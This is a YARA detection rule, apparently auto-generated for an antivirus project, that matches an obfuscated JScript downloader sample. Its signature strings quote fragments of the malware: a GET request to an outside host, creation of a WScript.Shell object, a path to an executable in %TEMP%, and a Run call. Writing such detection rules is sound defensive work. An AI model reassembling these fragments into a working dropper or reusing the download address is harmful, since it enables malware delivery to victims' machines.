rule sig_20160330_d160231af00f1c11d0de8fd2ee651193 {
  meta:
    description = "datamaliciousorder - file 20160330_d160231af00f1c11d0de8fd2ee651193.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "836621ae97e30a6ac3d6827726ceceb059e8b28fe66dbd1958b2a37e8a5944e2"

  strings:
    $s1  = "function _OC(_N, _XT){_MM = _MM * 1; return _N - _XT;};" fullword ascii
    $s2  = "_EC[_Y](\"GET\", \"http://ru-optovik.ru/j9ssl\", false);" fullword ascii
    $s3  = "var _DY = function _RC() {return WScript[_Z](\"WScript\"+\".Shell\");}(), _M = 11;" fullword ascii
    $s4  = "if (_EC[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _P() {return _DY[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"WYWmy4NkGbo.ex\" + \"e\";};" fullword ascii
    $s6  = "function _LW(){return _PY + \"\";};" fullword ascii
    $s7  = "function _J() {return ((_GR == true) && (_GR == _L)) ? 1 : _MM;};" fullword ascii
    $s8  = "function _DD(_Z1){_DY[\"Run\"](_Z1, _MM, _MM);};" fullword ascii
    $s9  = "function _H(){return 22;};" fullword ascii
    $s10 = " while (_C){" fullword ascii
    $s11 = "function _S(){return _Z;};" fullword ascii
    $s12 = "function _KJ()" fullword ascii
    $s13 = "return _OC(_CI, _TP);" fullword ascii
    $s14 = "var _TM = new this[\"Date\"]();" fullword ascii
    $s15 = "function _V(_G) {var _S0 = (1, 2, 3, 4, 5, _G); return _S0;};" fullword ascii
    $s16 = "var _L = false;" fullword ascii
    $s17 = "_L = true; " fullword ascii
    $s18 = "var _QA = false;" fullword ascii
    $s19 = "_GR = true; " fullword ascii
    $s20 = "var _GR = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}